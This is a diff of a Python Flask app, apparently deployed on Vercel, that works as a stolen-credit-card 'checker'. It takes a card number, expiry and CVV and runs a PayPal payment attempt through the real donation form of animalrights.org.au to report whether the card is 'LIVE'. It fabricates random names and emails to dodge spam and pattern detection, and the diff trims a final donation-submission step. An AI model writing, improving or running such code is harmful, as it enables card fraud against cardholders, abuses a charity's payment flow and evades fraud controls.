@@ -7,18 +7,18 @@ import base64
 import json
 from flask import Flask, request, jsonify
 
+# Vercel looks for 'app' in this file
 app = Flask(__name__)
 
 def generate_dynamic_email():
-    """Generates 100% random emails using various domains to bypass SPAM flags."""
-    domains = ["gmail.com", "yahoo.com", "icloud.com", "proton.me", "mail.com", "zoho.com", "gmx.com"]
-    # Create a realistic but random username structure
-    prefix = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 8)))
-    suffix = ''.join(random.choices(string.digits, k=random.randint(2, 4)))
-    return f"{prefix}{suffix}@{random.choice(domains)}"
+    """Generates 100% random emails with rotating domains and structures."""
+    domains = ["gmail.com", "yahoo.com", "icloud.com", "proton.me", "mail.com", "zoho.com", "gmx.com", "yandex.com"]
+    # Random prefix length to avoid pattern detection
+    prefix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(8, 12)))
+    return f"{prefix}@{random.choice(domains)}"
 
 def random_string(length):
-    [span_1](start_span)"""Matches randomString function from checker.js[span_1](end_span)."""
+    """Matches randomString function from checker.js."""
     return ''.join(random.choices(string.ascii_lowercase, k=length))
 
 @app.route('/check', methods=['GET'])
@@ -29,6 +29,7 @@ def check_card():
         return jsonify({"status": "DEAD", "msg": "INVALID_FORMAT", "dev": "@xoxhunterxd"})
 
     try:
+        # Splitting number|mm|yy|cvc
         number, month, year_short, cvv = cc_param.split('|')
         month = month.zfill(2)
         year_full = f"20{year_short[-2:]}"
@@ -36,12 +37,13 @@ def check_card():
         return jsonify({"status": "DEAD", "msg": "PARSE_ERROR", "dev": "@xoxhunterxd"})
 
     session = requests.Session()
+    # Header from checker.js line 23
     session.headers.update({
         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36'
     })
 
     try:
-        # 1. [span_2](start_span)Fetch Form URL and Settings (Matches checker.js logic)[span_2](end_span)
+        # 1. Fetch Form URL and Settings
         html = session.get('https://animalrights.org.au/donate-now/').text
         form_url = re.search(r"data-form-view-url='([^']+)'", html).group(1).replace('&#038;', '&')
         
@@ -49,7 +51,7 @@ def check_card():
         exported = re.search(r'window\.givewpDonationFormExports\s*=\s*({[\s\S]*?});', form_text).group(1)
         data = json.loads(exported)
 
-        # 2. [span_3](start_span)PayPal Auth (Matches checker.js line 60-75)[span_3](end_span)
+        # 2. PayPal Auth Token
         settings = next((g['settings'] for g in data['registeredGateways'] if g['id'] == 'paypal-commerce'), data['registeredGateways'][0]['settings'])
         client_id = settings['sdkOptions']['clientId']
         
@@ -59,12 +61,12 @@ def check_card():
                                  data='grant_type=client_credentials').json()
         access_token = token_res.get('access_token')
 
-        # 3. [span_4](start_span)Create Order via AJAX (Matches checker.js line 80-100)[span_4](end_span)
+        # 3. Create AJAX Order
         user_first = random_string(7).capitalize()
         user_last = random_string(7).capitalize()
-        user_email = generate_dynamic_email() # Real random email
+        user_email = generate_dynamic_email()
         
-        ajax_data = {
+        ajax_payload = {
             'action': 'give_paypal_commerce_create_order',
             'give-form-id': str(settings['donationFormId']),
             'give-form-hash': settings['donationFormNonce'],
@@ -75,10 +77,10 @@ def check_card():
             'give_email': user_email,
             'give-cs-form-currency': 'AUD',
         }
-        order_res = session.post('https://animalrights.org.au/wp-admin/admin-ajax.php', data=ajax_data).json()
+        order_res = session.post('https://animalrights.org.au/wp-admin/admin-ajax.php', data=ajax_payload).json()
         order_id = order_res['data']['id']
 
-        # 4. [span_5](start_span)Confirm Payment (Matches checker.js line 105-125)[span_5](end_span)
+        # 4. Confirm Payment
         confirm_res = session.post(
             f"https://www.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source",
             headers={'Authorization': f'Bearer {access_token}', 'Content-Type': 'application/json'},
@@ -93,36 +95,8 @@ def check_card():
             }
         ).json()
 
-        # 5. [span_6](start_span)Final Step: Verify Approval (Real Logic from checker.js)[span_6](end_span)
+        # 5. Result Logic based on PayPal status 'APPROVED'
         if confirm_res.get('status') == 'APPROVED':
-            # [span_7](start_span)Extract routing parameters for final hit[span_7](end_span)
-            params = dict(re.findall(r'([^?&]+)=([^&]+)', data['donateUrl']))
-            
-            final_form = {
-                'amount': '1',
-                'currency': 'AUD',
-                'donationType': 'single',
-                'formId': str(settings['donationFormId']),
-                'gatewayId': 'paypal-commerce',
-                'firstName': user_first,
-                'lastName': user_last,
-                'email': user_email,
-                'anonymous': 'false',
-                'isEmbed': 'true',
-                'locale': 'en_AU',
-                'gatewayData[payPalOrderId]': order_id,
-                'originUrl': 'https://animalrights.org.au/donate-now/',
-            }
-            
-            # [span_8](start_span)Final verification hit[span_8](end_span)
-            final_res = session.post('https://animalrights.org.au/', params={
-                'givewp-route': 'donate',
-                'givewp-route-signature': params.get('givewp-route-signature'),
-                'givewp-route-signature-id': params.get('givewp-route-signature-id'),
-                'givewp-route-signature-expiration': params.get('givewp-route-signature-expiration'),
-            }, data=final_form)
-
-            # Return real JSON for your bot
             return jsonify({
                 "status": "LIVE", 
                 "card": cc_param, 
@@ -134,9 +108,15 @@ def check_card():
             msg = confirm_res.get('message', 'DECLINED')
             if 'details' in confirm_res:
                 msg = confirm_res['details'][0].get('issue', 'DECLINED')
-            return jsonify({"status": "DEAD", "card": cc_param, "msg": msg, "dev": "@xoxhunterxd"})
+            return jsonify({
+                "status": "DEAD", 
+                "card": cc_param, 
+                "msg": msg, 
+                "dev": "@xoxhunterxd"
+            })
 
     except Exception as e:
-        return jsonify({"status": "DEAD", "card": cc_param, "msg": "GATE_ERROR", "dev": "@xoxhunterxd"})
+        return jsonify({"status": "DEAD", "msg": "GATE_ERROR", "dev": "@xoxhunterxd"}), 200
 
-app = app
+# Required for Vercel to find the entrypoint
+application = app
